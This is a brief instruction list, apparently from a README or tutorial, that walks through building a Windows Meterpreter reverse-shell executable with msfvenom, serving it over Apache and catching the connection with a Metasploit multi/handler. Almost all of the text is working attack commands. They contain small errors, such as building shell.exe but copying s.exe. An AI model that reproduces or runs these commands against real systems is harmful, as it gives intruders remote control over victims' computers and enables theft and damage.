## Instructions:
  ### On the host machine (linux): // Note: (change 192.168.0.24 to your ip, and 8080 to the port you desire)
   1.  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.24 LPORT=8080 -f exe > shell.exe   
   2.  cp s.exe /var/www/html
   3.  service apache2 start
   3.  msfconsole
   4.  use exploit/multi/handler
   5.  set PAYLOAD windows/meterpreter/reverse_tcp
   6.  set LHOST 192.168.0.24
   7.  set LPORT 8080
   8.  exploit
  
